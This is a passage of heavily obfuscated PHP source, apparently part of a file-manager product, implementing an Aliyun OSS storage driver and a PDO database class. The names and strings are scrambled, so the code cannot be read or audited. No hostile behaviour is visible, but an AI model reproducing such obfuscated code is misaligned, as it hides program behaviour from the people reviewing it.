$¾é˜Ø©—) { return !0; } } } else { if (!empty($úı²üõ¼)) { return !0; } } if ($Êƒ¡±›ò === $ŠÎÂÜ³[12]) { break; } } if ($©ú¬ôıÑ) { return array($ŠÎÂÜ³[207] => $˜— Œ¨ğ, $ŠÎÂÜ³[208] => $¡¶Éı‹˜); } return !1; } public function listAll($ìÅª‚«) { $¸®Å÷²î =& $_SERVER[­õöî’–]; $£½ª¸¿† = $this->fileList($ìÅª‚«, $¸®Å÷²î[12], !0); $Ö×ƒ–¥ = array(); foreach ($£½ª¸¿†[$¸®Å÷²î[83]] as $ŸÂÁ®) { $Ö×ƒ–¥[$ŸÂÁ®[$¸®Å÷²î[32]]] = $ŸÂÁ®[$¸®Å÷²î[76]]; } foreach ($£½ª¸¿†[$¸®Å÷²î[82]] as $ŸÂÁ®) { if (is_string($ŸÂÁ®)) { $Ö×ƒ–¥[$ŸÂÁ®] = 0; } } return $this->listAllFiles($ìÅª‚«, array_keys($Ö×ƒ–¥), $Ö×ƒ–¥); } public function canRead($¦ÉÄÎ”Ø) { $ñÙ„£ë =& $_SERVER[­õöî’–]; $äÎ÷‹ßØ = $this->pathAcl($¦ÉÄÎ”Ø); return $äÎ÷‹ßØ == $ñÙ„£ë[1413] || $äÎ÷‹ßØ == $ñÙ„£ë[556] ? !0 : !1; } public function canWrite($­’—ïà‡) { $«ä–³¹Â = $this->pathAcl($­’—ïà‡); return $«ä–³¹Â == $_SERVER[­õöî’–][556] ? !0 : !1; } public function pathAcl($İ±¡İ¼÷) { $¹˜è•Œè =& $_SERVER[­õöî’–]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $…ÌÙş‹ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($İ±¡İ¼÷)); } catch (OSS\Core\OssException $åò¥ÓŸ¡) { return !1; } $É­µÍÎÖ = $…ÌÙş‹ == $¹˜è•Œè[37] ? $this->bucketAcl : $…ÌÙş‹; if ($É­µÍÎÖ == $¹˜è•Œè[1414]) { return $¹˜è•Œè[1413]; } if ($É­µÍÎÖ == $¹˜è•Œè[1415]) { return $¹˜è•Œè[556]; } return $É­µÍÎÖ; } private function chmodPath($Öü´·, $Õ­¡ïí = '') { $„ïÜ£¢… =& $_SERVER[­õöî’–]; $ÔÅßŞ§‚ = empty($Õ­¡ïí) ? $„ïÜ£¢…[1415] : $Õ­¡ïí; $Ù§¶Í—£ = array($„ïÜ£¢…[37], $„ïÜ£¢…[198], $„ïÜ£¢…[1414], $„ïÜ£¢…[1415]); if (!in_array($ÔÅßŞ§‚, $Ù§¶Í—£)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Öü´·), $ÔÅßŞ§‚); } catch (OSS\Core\OssException $×›ş¬Á ) { return !1; } return !0; } public function getContent($æ˜™Åà˜) { return $this->fileSubstr($æ˜™Åà˜, -1); } public function setContent($É¿îÂøò, $²ˆ§öµ = '') { $ÖÈ±¨Ùœ =& $_SERVER[­õöî’–]; try { $¿˜ÊˆÍÂ = $this->trafficLimit($ÖÈ±¨Ùœ[1416]); $µáóõ–® = $this->client->putObject($this->bucket, $this->pathEncode($É¿îÂøò), $²ˆ§öµ, $¿˜ÊˆÍÂ); } catch (OSS\Core\OssException $òë¶¥±ö) { return !1; } $äÕ£© = array($ÖÈ±¨Ùœ[1406] => trim($µáóõ–®[$ÖÈ±¨Ùœ[1417]], $ÖÈ±¨Ùœ[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($É¿îÂøò))); $this->updateObjMeta($É¿îÂøò, $äÕ£©); return isset($µáóõ–®[$ÖÈ±¨Ùœ[1418]][$ÖÈ±¨Ùœ[1365]]) ? !0 : !1; } private function updateObjMeta($ÜÌŠ¸º¢, $ÂĞİ™ª) { $ÜÌŠ¸º¢ = $this->pathEncode($ÜÌŠ¸º¢); try { $ƒî§»Â¬ = array(OSS\OssClient::OSS_HEADERS => $ÂĞİ™ª); $this->client->copyObject($this->bucket, $ÜÌŠ¸º¢, $this->bucket, $ÜÌŠ¸º¢, $ƒî§»Â¬); } catch (OSS\Core\OssException $îÇ±Èó‘) { return !1; } return !0; } public function upload($Ë¼îÔ‹, $¥®íí, $Ÿ¯ÂçÜß = false, $î»¿ßÆ = REPEAT_REPLACE) { $Íñù’€ =& $_SERVER[­õöî’–]; $ãš›Ñï™ = trim($Ë¼îÔ‹, $Íñù’€[8]); $ÎôÉÎÍ¢ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Íñù’€[1406] => @md5_file($¥®íí)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ë¼îÔ‹))); $ÎôÉÎÍ¢ = $this->trafficLimit($Íñù’€[1416], $ÎôÉÎÍ¢); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ãš›Ñï™), $¥®íí, $ÎôÉÎÍ¢); } catch (OSS\Core\OssException $ÁÇóğ­•) { return !1; } return $this->getPathOuter($Ë¼îÔ‹); } public function getHost() { $»ş‚ßñş =& $_SERVER[­õöî’–]; $ç„Ó„… = explode($»ş‚ßñş[183], parent::getHost()); return $ç„Ó„…[0] . $»ş‚ßñş[183] . $this->bucket . $»ş‚ßñş[10] . $ç„Ó„…[1]; } public function uploadFormData($à†úÕò¤, $ÊÖ™º¤ = 3600) { $»æĞ¡ş¬ =& $_SERVER[­õöî’–]; if (!($éÜ±Â©é = $this->getHost())) { return !1; } $Éè…Íî’ = $ÊÖ™º¤; $…¾è±× = date($»æĞ¡ş¬[1419], time() + $Éè…Íî’); $ø“ àÎì = new DateTime($…¾è±×); $ä”ŞÌ˜¬ = $ø“ àÎì->format(DateTime::ISO8601); $ùó§ˆƒî = strpos($ä”ŞÌ˜¬, $»æĞ¡ş¬[296]); $ä”ŞÌ˜¬ = substr($ä”ŞÌ˜¬, 0, $ùó§ˆƒî) . $»æĞ¡ş¬[1420]; $Îş±©ñÜ = 1048576000 * 5; $¿ª ×³ = $this->pathFather($à†úÕò¤); $üÎôÃÕ¦ = array($»æĞ¡ş¬[1319] => $ä”ŞÌ˜¬, $»æĞ¡ş¬[1320] => array(array($»æĞ¡ş¬[1421], 0, $Îş±©ñÜ), array($»æĞ¡ş¬[1323], $»æĞ¡ş¬[1324], $¿ª ×³))); $á°¾í‹ = base64_encode(json_encode($üÎôÃÕ¦)); $œ§ÓËõ¥ = base64_encode(hash_hmac($»æĞ¡ş¬[232], $á°¾í‹, $this->secret, !0)); $¬’æ‘¸ = array($»æĞ¡ş¬[1329] => $á°¾í‹, $»æĞ¡ş¬[1422] => $this->accessKey, $»æĞ¡ş¬[1325] => $»æĞ¡ş¬[1317], $»æĞ¡ş¬[1423] => $œ§ÓËõ¥, $»æĞ¡ş¬[181] => $éÜ±Â©é); $¬’æ‘¸ = $this->trafficLimit($»æĞ¡ş¬[1416], $¬’æ‘¸); return $¬’æ‘¸; } public function multiUploadFormData($í»¦èŞ, $´œÜè¢ = 3600) { $Ÿúú’¦ =& $_SERVER[­õöî’–]; if (!($¾ÑÀßØá = $this->getHost())) { return !1; } $ Å»ñâÅ = $this->trafficLimit($Ÿúú’¦[1416]); $¿¹Ò²‡ë = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($í»¦èŞ), $ Å»ñâÅ); return array($Ÿúú’¦[223] => $¿¹Ò²‡ë, $Ÿúú’¦[181] => $¾ÑÀßØá . $Ÿúú’¦[8] . $this->pathEncode($í»¦èŞ), $Ÿúú’¦[224] => gmdate($Ÿúú’¦[1424]), $Ÿúú’¦[94] => $í»¦èŞ); } public function multiUploadAuthData($¾«ì²…û, $¾¦»§  = array()) { $€„ŠâºĞ =& $_SERVER[­õöî’–]; $¬ŸËÊÎû = isset($¾¦»§ [$€„ŠâºĞ[224]]) ? $¾¦»§ [$€„ŠâºĞ[224]] : gmdate($€„ŠâºĞ[1424]); $ÒÖøïë‚ = isset($¾¦»§ [$€„ŠâºĞ[174]]) ? $¾¦»§ [$€„ŠâºĞ[174]] : $€„ŠâºĞ[12]; $…‡Ş¬äñ = $¾«ì²…û; if (isset($¾¦»§ [$€„ŠâºĞ[94]])) { $…‡Ş¬äñ = $¾¦»§ [$€„ŠâºĞ[94]]; unset($¾¦»§ [$€„ŠâºĞ[94]]); } if (isset($¾¦»§ [$€„ŠâºĞ[225]])) { $¾¦»§ [$€„ŠâºĞ[224]] = $¬ŸËÊÎû; return $this->listUploadParts($…‡Ş¬äñ, $¾¦»§ ); } $ÅüÂØœÇ = array($€„ŠâºĞ[226], $€„ŠâºĞ[12], $€„ŠâºĞ[120], $¬ŸËÊÎû, "\x78\x2d\x6f\163\x73\x2d\144\x61\164\x65\72{$¬ŸËÊÎû}", $€„ŠâºĞ[8] . $this->bucket . $€„ŠâºĞ[8] . $…‡Ş¬äñ . $ÒÖøïë‚); if (strpos($ÒÖøïë‚, $€„ŠâºĞ[227]) === 0) { $ÅüÂØœÇ[0] = $€„ŠâºĞ[228]; if ($¶âÙÉÍ = $this->trafficLimit($€„ŠâºĞ[1416])) { $…‡Ş¬äñ = $€„ŠâºĞ[1425]; array_splice($ÅüÂØœÇ, 5, 0, $…‡Ş¬äñ . $€„ŠâºĞ[4] . $¶âÙÉÍ[$…‡Ş¬äñ]); } } if (isset($¾¦»§ [$€„ŠâºĞ[229]]) && $¾¦»§ [$€„ŠâºĞ[229]] == $€„ŠâºĞ[230]) { $ÅüÂØœÇ[0] = $€„ŠâºĞ[230]; } if (!empty($¾¦»§ [$€„ŠâºĞ[1426]])) { $Êîâ¿¶‰ = array_merge(array($ÅüÂØœÇ[4]), $¾¦»§ [$€„ŠâºĞ[1426]]); sort($Êîâ¿¶‰); $ÅüÂØœÇ[4] = implode($€„ŠâºĞ[231], $Êîâ¿¶‰); } $ÊÖô¶¢ê = implode($€„ŠâºĞ[231], $ÅüÂØœÇ); $ÓÛ½·†Ø = base64_encode(hash_hmac($€„ŠâºĞ[232], $ÊÖô¶¢ê, $this->secret, !0)); $«Ôı‚½ = $€„ŠâºĞ[1390] . $this->accessKey . $€„ŠâºĞ[4] . $ÓÛ½·†Ø; if (strpos($ÒÖøïë‚, $€„ŠâºĞ[227]) === 0) { $«Ôı‚½ = array($€„ŠâºĞ[234] => $«Ôı‚½, $€„ŠâºĞ[224] => $¬ŸËÊÎû); if ($¶âÙÉÍ) { $«Ôı‚½ = array_merge($«Ôı‚½, $¶âÙÉÍ); } } return $«Ôı‚½; } public function listUploadParts($ıÜÙ³ì, $Â¾ï¶Âç) { $’°®âşÊ =& $_SERVER[­õöî’–]; $‹¯Õ€ÙŠ = parse_url_query($Â¾ï¶Âç[$’°®âşÊ[174]]); $êŒ¼à°Ã = $this->client->listParts($this->bucket, $this->pathEncode($ıÜÙ³ì), $‹¯Õ€ÙŠ[$’°®âşÊ[223]]); $ÂßºğñÏ = $êŒ¼à°Ã->getListPart(); $Ü·•«€ = array(); foreach ($ÂßºğñÏ as $ÅÒÍ¢â) { $Ü·•«€[] = array($’°®âşÊ[1410] => $ÅÒÍ¢â->getPartNumber(), $’°®âşÊ[1411] => trim($ÅÒÍ¢â->getETag(), $’°®âşÊ[118])); } unset($Â¾ï¶Âç[$’°®âşÊ[225]], $Â¾ï¶Âç[$’°®âşÊ[229]]); $»™­áñõ = $this->multiUploadAuthData($ıÜÙ³ì, $Â¾ï¶Âç); if (empty($»™­áñõ)) { return !1; } return array($’°®âşÊ[234] => $»™­áñõ, $’°®âşÊ[224] => $Â¾ï¶Âç[$’°®âşÊ[224]], $’°®âşÊ[236] => $Ü·•«€); } public function download($ÁšÎñ—°, $¹­ËÙØ) { if ($this->isFolder($ÁšÎñ—°)) { return !1; } try { $€Ô®¨šÆ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¹­ËÙØ); $€Ô®¨šÆ = $this->trafficLimit($_SERVER[­õöî’–][109], $€Ô®¨šÆ); $this->client->getObject($this->bucket, $this->pathEncode($ÁšÎñ—°), $€Ô®¨šÆ); } catch (OSS\Core\OssException $—ˆÅˆ±) { return !1; } return $¹­ËÙØ; } public function fileSubstr($”‡Íë½Á, $ÉÒ”Ö‚Ò = 0, $£ØÙ¼ÁÊ = false) { if ($ÉÒ”Ö‚Ò === -1) { $°ö·ßì˜ = array(); } else { if ($£ØÙ¼ÁÊ === !1) { $ú¤ıÕÎ = $this->size($”‡Íë½Á); } else { $ú¤ıÕÎ = $ÉÒ”Ö‚Ò + $£ØÙ¼ÁÊ - 1; } $°ö·ßì˜ = array(OSS\OssClient::OSS_RANGE => "{$ÉÒ”Ö‚Ò}\x2d{$ú¤ıÕÎ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($”‡Íë½Á), $°ö·ßì˜); } catch (OSS\Core\OssException $…ÏøµÓˆ) { think_exception($…ÏøµÓˆ->getMessage()); return !1; } } private function trafficLimit($Ÿˆœ¢­ã, $¹ÎÀ™×Í = array()) { $‰Õüöâç =& $_SERVER[­õöî’–]; if ($Ÿˆœ¢­ã == $‰Õüöâç[1416] && $this->isUploadServer() || $Ÿˆœ¢­ã == $‰Õüöâç[109] && $this->isFileOutServer()) { return $¹ÎÀ™×Í; } $ÑËàšÅˆ = floatval($GLOBALS[$‰Õüöâç[6]][$‰Õüöâç[89]][$‰Õüöâç[107]][$Ÿˆœ¢­ã]) * 1024 * 1024 * 8; if (!$ÑËàšÅˆ) { return $¹ÎÀ™×Í; } $ÑËàšÅˆ = $ÑËàšÅˆ < 819200 ? 819200 : ($ÑËàšÅˆ > 838860800 ? 838860800 : $ÑËàšÅˆ); $¹ÎÀ™×Í[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÑËàšÅˆ); return $¹ÎÀ™×Í; } public function link($¶Îô‘ü, $µŸğÎÖ = array()) { $»°‘¦­• =& $_SERVER[­õöî’–]; if (!$this->exist($¶Îô‘ü) || $this->isFolder($¶Îô‘ü)) { return !1; } try { $µŸğÎÖ = $this->trafficLimit($»°‘¦­•[109], $µŸğÎÖ); $óù¿”•Ã = $this->client->signUrl($this->bucket, $this->pathEncode($¶Îô‘ü), 3600 * 12, $»°‘¦­•[230], $µŸğÎÖ); return $this->getCdnLink($óù¿”•Ã); } catch (OSS\Core\OssException $İå¾”¡…) { return !1; } } public function fileOut($Ú¾Ûó•”, $¾ëØ´‘ç = false, $Ù£–ë¨§ = false, $“Îá•ô = '') { $¦ÚšÁ±’ =& $_SERVER[­õöî’–]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ú¾Ûó•”, $¾ëØ´‘ç, $Ù£–ë¨§, $“Îá•ô); } if (!$Ù£–ë¨§) { $Ù£–ë¨§ = $this->pathThis($Ú¾Ûó•”); } $Ù£–ë¨§ = rawurlencode($Ù£–ë¨§); $µìÄö­ß = get_file_mime(get_path_ext($Ù£–ë¨§)); if ($µìÄö­ß == $¦ÚšÁ±’[217]) { return parent::fileOut($Ú¾Ûó•”, $¾ëØ´‘ç, $Ù£–ë¨§, $“Îá•ô); } $¾ëØ´‘ç = $¾ëØ´‘ç ? $¦ÚšÁ±’[1427] : $¦ÚšÁ±’[1428]; $ßÇéş­Ê = array(OSS\OssClient::OSS_SUB_RESOURCE => $¦ÚšÁ±’[1429] . rawurlencode("{$¾ëØ´‘ç}\73\x66\151\x6c\x65\x6e\x61\x6d\145\x3d{$Ù£–ë¨§}")); $ßÇéş­Ê[OSS\OssClient::OSS_SUB_RESOURCE] .= $¦ÚšÁ±’[1430] . rawurlencode($µìÄö­ß); $¢±æÄèÜ = $this->link($Ú¾Ûó•”, $ßÇéş­Ê); $this->fileOutLink($¢±æÄèÜ); } public function fileOutServer($…‡‹¬…», $ì¾ö·çë = false, $üßèáÄ‹ = false, $„Ö§ÉÖÕ = '') { parent::fileOut($…‡‹¬…», $ì¾ö·çë, $üßèáÄ‹, $„Ö§ÉÖÕ); } public function fileOutImage($£üèÖ¡É, $±ô°Ÿôƒ = 250) { $£ÓìƒÓ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[­õöî’–][1431] . $±ô°Ÿôƒ); $”ú‡£»½ = $this->link($£üèÖ¡É, $£ÓìƒÓ); $this->fileOutLink($”ú‡£»½); } public function fileOutImageServer($Ñ¦¨äÄè, $òò•€¡ = 250) { parent::fileOutImage($Ñ¦¨äÄè, $òò•€¡); } public function fileOutLink($ìØ’È·´) { $é’¯ì¼À =& $_SERVER[­õöî’–]; if (!$this->isCdnHost() && substr($ìØ’È·´, 0, 7) == $é’¯ì¼À[1332]) { $ìØ’È·´ = $é’¯ì¼À[1333] . substr($ìØ’È·´, 7); } header($é’¯ì¼À[161] . $ìØ’È·´); die; } public function hashMd5($áÃŸä—’, $éú‡›Šï = '') { $¬ Ô¦ø =& $_SERVER[­õöî’–]; $Æ®±ìŸ = $this->_objectMeta($áÃŸä—’); if (!$Æ®±ìŸ) { return $¬ Ô¦ø[12]; } if (!isset($Æ®±ìŸ[$¬ Ô¦ø[1406]]) && !empty($éú‡›Šï)) { $óå®²õ = $this->updateObjMeta($áÃŸä—’, array($¬ Ô¦ø[1406] => $éú‡›Šï)); $Æ®±ìŸ[$¬ Ô¦ø[1406]] = $óå®²õ ? $éú‡›Šï : $¬ Ô¦ø[12]; } return isset($Æ®±ìŸ[$¬ Ô¦ø[1406]]) ? strtolower($Æ®±ìŸ[$¬ Ô¦ø[1406]]) : $¬ Ô¦ø[12]; } public function size($¼Ğ˜›ºø) { $ôÛÚŒµ = $this->objectMeta($¼Ğ˜›ºø); return $ôÛÚŒµ ? $ôÛÚŒµ[$_SERVER[­õöî’–][76]] : 0; } public function info($îó›ï™Ó) { if ($this->isFolder($îó›ï™Ó)) { return $this->folderInfo($îó›ï™Ó); } else { if ($this->isFile($îó›ï™Ó)) { return $this->fileInfo($îó›ï™Ó); } } return !1; } public function exist($ƒ‰°êÊÉ) { return $this->isFile($ƒ‰°êÊÉ) || $this->isFolder($ƒ‰°êÊÉ); } public function isFile($ŒéÊéÊÏ) { return !$this->isFolder($ŒéÊéÊÏ) && $this->objectMeta($ŒéÊéÊÏ); } public function isFolder($Ä»ÇºŸ) { return $this->cacheMethod($_SERVER[­õöî’–][165], $Ä»ÇºŸ); } protected function objectMeta($ÕŒ•ÙíÊ) { return $this->cacheMethod($_SERVER[­õöî’–][167], $ÕŒ•ÙíÊ); } protected function _objectMeta($ˆ¸ Ş£¶) { $°öÖ¥àŒ =& $_SERVER[­õöî’–]; try { $ Ù®Äï¢ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ˆ¸ Ş£¶)); } catch (OSS\Core\OssException $öüÎŒİ‹) { $ Ù®Äï¢ = !1; } if ($ Ù®Äï¢) { $ Ù®Äï¢[$°öÖ¥àŒ[76]] = intval($ Ù®Äï¢[$°öÖ¥àŒ[1404]]); } return $ Ù®Äï¢; } protected function _isFolder($‹±ìŠÓƒ) { $ï‹ß¬¥ =& $_SERVER[­õöî’–]; if ($‹±ìŠÓƒ == $ï‹ß¬¥[12] || $‹±ìŠÓƒ == $ï‹ß¬¥[8]) { return !0; } $ï§‡¶’± = array($ï‹ß¬¥[1400] => $ï‹ß¬¥[8], $ï‹ß¬¥[1401] => rtrim($‹±ìŠÓƒ, $ï‹ß¬¥[8]) . $ï‹ß¬¥[8], $ï‹ß¬¥[1402] => 1, $ï‹ß¬¥[1403] => $ï‹ß¬¥[12]); $Îä™×»Œ = $this->client->listObjects($this->bucket, $ï§‡¶’±); if ($Îä™×»Œ->getObjectList() || $Îä™×»Œ->getPrefixList()) { return !0; } return !1; } } goto c·ŠÙòŒÌ; dê˜œ×æ¤: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($÷´ƒ…‹ô = '') { $ƒÊŞÆ½¼ =& $_SERVER[­õöî’–]; if (!class_exists($ƒÊŞÆ½¼[912])) { think_exception(think_lang($ƒÊŞÆ½¼[14]) . $ƒÊŞÆ½¼[913]); } if (!empty($÷´ƒ…‹ô)) { $this->config = $÷´ƒ…‹ô; if (empty($this->config[$ƒÊŞÆ½¼[17]])) { $this->config[$ƒÊŞÆ½¼[17]] = array(); } } } public function connect($İ‘ìğÇ = '', $‚ğ´ß¼¾ = 0) { $É¶ë¸¶â =& $_SERVER[­õöî’–]; if (!isset($this->linkID[$‚ğ´ß¼¾])) { if (empty($İ‘ìğÇ)) { $İ‘ìğÇ = $this->config; } $„÷Áø©… = !empty($İ‘ìğÇ[$É¶ë¸¶â[17]][$É¶ë¸¶â[18]]) ? $İ‘ìğÇ[$É¶ë¸¶â[17]][$É¶ë¸¶â[18]] : $this->pconnect; if ($„÷Áø©…) { $İ‘ìğÇ[$É¶ë¸¶â[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$‚ğ´ß¼¾] = new PDO($İ‘ìğÇ[$É¶ë¸¶â[914]], $İ‘ìğÇ[$É¶ë¸¶â[885]], $İ‘ìğÇ[$É¶ë¸¶â[886]], $İ‘ìğÇ[$É¶ë¸¶â[17]]); } catch (PDOException $•Õüƒ±) { think_exception($•Õüƒ±->getMessage()); } $this->dbType = $this->_getDsnType($İ‘ìğÇ[$É¶ë¸¶â[914]]); if (in_array($this->dbType, array($É¶ë¸¶â[915], $É¶ë¸¶â[916], $É¶ë¸¶â[917], $É¶ë¸¶â[918]))) { think_exception($É¶ë¸¶â[919] . $this->dbType . $É¶ë¸¶â[920] . $this->dbType . $É¶ë¸¶â[921]); } if (!$this->linkID[$‚ğ´ß¼¾]) { think_exception($É¶ë¸¶â[922]); } try { $this->linkID[$‚ğ´ß¼¾]->exec($É¶ë¸¶â[923] . think_config($É¶ë¸¶â[888])); } catch (Exception $•Õüƒ±) { } $this->connected = !0; if (1 != think_config($É¶ë¸¶â[22])) { unset($this->config); } } return $this->linkID[$‚ğ´ß¼¾]; } public function free() { $this->PDOStatement = null; } public function query($¥á®õâ, $†®¤ä‡€ = array()) { $½Ñòİ³ô =& $_SERVER[­õöî’–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¥á®õâ; if (!empty($†®¤ä‡€)) { $this->queryStr .= $½Ñòİ³ô[924] . print_r($†®¤ä‡€, !0) . $½Ñòİ³ô[925]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($½Ñòİ³ô[23], 1); think_status($½Ñòİ³ô[24]); $this->PDOStatement = $this->_linkID->prepare($¥á®õâ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ Ë˜ÌÂ¡ = $this->PDOStatement->execute($†®¤ä‡€); $this->debug(); if (!1 === $ Ë˜ÌÂ¡) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Š†µáË, $”Û°åˆ = array()) { $„˜ÏÏ¡é =& $_SERVER[­õöî’–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Š†µáË; if (!empty($”Û°åˆ)) { $this->queryStr .= $„˜ÏÏ¡é[924] . print_r($”Û°åˆ, !0) . $„˜ÏÏ¡é[925]; } $‡âÖø = !1; if ($this->dbType == $„˜ÏÏ¡é[918]) { if (preg_match($„˜ÏÏ¡é[926], $this->queryStr, $˜òÉ¨Å¦)) { $this->table = think_config($„˜ÏÏ¡é[927]) . str_ireplace(think_config($„˜ÏÏ¡é[928]), $„˜ÏÏ¡é[378], $˜òÉ¨Å¦[2]); $‡âÖø = (bool) $this->query($„˜ÏÏ¡é[929] . strtoupper($this->table) . $„˜ÏÏ¡é[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($„˜ÏÏ¡é[25], 1); think_status($„˜ÏÏ¡é[24]); $this->PDOStatement = $this->_linkID->prepare($Š†µáË); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $®éõğ”Ï = $this->PDOStatement->execute($”Û°åˆ); $this->debug(); if (!1 === $®éõğ”Ï) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($‡âÖø || preg_match($„˜ÏÏ¡é[930], $Š†µáË)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ò¹¶Ñó = $this->_linkID->commit(); $this->transTimes = 0; if (!$ò¹¶Ñó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ğ®îœ£ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ğ®îœ£) { $this->error(); return !1; } } return !0; } private function getAll() { $Ğáˆôş = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ğáˆôş); return $Ğáˆôş; } public function getFields($Æ‰Ë³´) { $°È¦‹–ş =& $_SERVER[­õöî’–]; $this->initConnect(!0); if (think_config($°È¦‹–ş[931])) { $´äØœí = str_replace($°È¦‹–ş[932], $Æ‰Ë³´, think_config($°È¦‹–ş[931])); } else { switch ($this->dbType) { case $°È¦‹–ş[915]: case $°È¦‹–ş[933]: $´äØœí = "\x53\x45\114\105\103\x54\x20\x20\x20\143\x6f\x6c\x75\155\156\137\156\141\x6d\145\40\141\x73\40\47\116\141\155\145\x27\54\x20\x20\x20\x64\141\164\x61\137\x74\171\x70\x65\40\141\x73\x20\x27\124\x79\x70\145\x27\54\x20\x20\x20\143\157\x6c\165\155\x6e\137\x64\145\x66\x61\x75\154\x74\40\141\x73\x20\x27\104\145\146\141\165\x6c\164\47\54\40\x20\40\x69\x73\137\x6e\x75\154\154\141\142\x6c\x65\40\141\x73\40\x27\x4e\x75\154\154\x27\xa\x9\11\x46\x52\x4f\115\x9\x69\156\x66\x6f\x72\x6d\141\x74\x69\x6f\x6e\x5f\163\143\150\145\155\141\56\164\x61\142\x6c\x65\x73\x20\x41\123\x20\x74\xa\11\x9\112\x4f\111\116\x9\x69\156\146\x6f\162\155\x61\x74\151\x6f\x6e\x5f\163\x63\150\145\155\141\x2e\x63\157\x6c\x75\155\x6e\x73\x20\x41\x53\x20\143\xa\x9\11\x4f\116\40\x20\x74\x2e\164\x61\x62\154\145\x5f\143\141\x74\x61\x6c\157\147\40\75\40\143\x2e\x74\x61\142\x6c\x65\x5f\143\141\164\x61\154\x6f\147\xa\x9\x9\x41\116\x44\40\164\56\164\x61\142\154\x65\x5f\163\143\150\145\x6d\141\40\75\x20\143\56\164\x61\x62\x6c\x65\x5f\x73\143\x68\x65\155\141\xa\x9\11\x41\116\x44\x20\x74\x2e\x74\x61\142\x6c\145\137\156\x61\155\x65\x20\75\x20\x63\x2e\164\141\x62\x6c\145\x5f\156\141\155\145\12\11\11\127\x48\105\x52\x45\x20\x20\40\x74\56\x74\x61\142\x6c\145\x5f\156\141\155\145\40\75\40\47{$Æ‰Ë³´}\47"; break; case $°È¦‹–ş[934]: $´äØœí = $°È¦‹–ş[935] . $Æ‰Ë³´ . $°È¦‹–ş[936]; break; case $°È¦‹–ş[916]: case $°È¦‹–ş[918]: $´äØœí = $°È¦‹–ş[937] . $°È¦‹–ş[938] . $°È¦‹–ş[939] . strtoupper($Æ‰Ë³´) . $°È¦‹–ş[940] . strtoupper($Æ‰Ë³´) . $°È¦‹–ş[941]; break; case $°È¦‹–ş[942]: $´äØœí = $°È¦‹–ş[943] . $Æ‰Ë³´ . $°È¦‹–ş[944]; break; case $°È¦‹–ş[917]: break; case $°È¦‹–ş[945]: default: $´äØœí = $°È¦‹–ş[946] . ($this->dbType == $°È¦‹–ş[945] ? "\140{$Æ‰Ë³´}\140" : $Æ‰Ë³´); } } $¦Š¼Ç’ = $this->query($´äØœí); $¹İ£«óĞ = array(); if ($¦Š¼Ç’) { foreach ($¦Š¼Ç’ as $¤éñÚô => $àÌÓŸ÷Ê) { $àÌÓŸ÷Ê = array_change_key_case($àÌÓŸ÷Ê); $àÌÓŸ÷Ê[$°È¦‹–ş[32]] = isset($àÌÓŸ÷Ê[$°È¦‹–ş[32]]) ? $àÌÓŸ÷Ê[$°È¦‹–ş[32]] : $°È¦‹–ş[378]; $àÌÓŸ÷Ê[$°È¦‹–ş[33]] = isset($àÌÓŸ÷Ê[$°È¦‹–ş[33]]) ? $àÌÓŸ÷Ê[$°È¦‹–ş[33]] : $°È¦‹–ş[378]; $™’Â˜º = isset($àÌÓŸ÷Ê[$°È¦‹–ş[273]]) ? $àÌÓŸ÷Ê[$°È¦‹–ş[273]] : $àÌÓŸ÷Ê[$°È¦‹–ş[32]]; $¹İ£«óĞ[$™’Â˜º] = array($°È¦‹–ş[32] => $™’Â˜º, $°È¦‹–ş[33] => $àÌÓŸ÷Ê[$°È¦‹–ş[33]], $°È¦‹–ş[35] => (bool) (isset($àÌÓŸ÷Ê[$°È¦‹–ş[103]]) && $àÌÓŸ÷Ê[$°È¦‹–ş[103]] === $°È¦‹–ş[12] || isset($àÌÓŸ÷Ê[$°È¦‹–ş[35]]) && $àÌÓŸ÷Ê[$°È¦‹–ş[35]] === $°È¦‹–ş[12]), $°È¦‹–ş[37] => isset($àÌÓŸ÷Ê[$°È¦‹–ş[37]]) ? $àÌÓŸ÷Ê[$°È¦‹–ş[37]] : (isset($àÌÓŸ÷Ê[$°È¦‹–ş[56]]) ? $àÌÓŸ÷Ê[$°È¦‹–ş[56]] : $°È¦‹–ş[378]), $°È¦‹–ş[39] => isset($àÌÓŸ÷Ê[$°È¦‹–ş[94]]) ? strtolower($àÌÓŸ÷Ê[$°È¦‹–ş[94]]) == $°È¦‹–ş[41] : (isset($àÌÓŸ÷Ê[$°È¦‹–ş[57]]) ? $àÌÓŸ÷Ê[$°È¦‹–ş[57]] : !1), $°È¦‹–ş[42] => isset($àÌÓŸ÷Ê[$°È¦‹–ş[947]]) ? 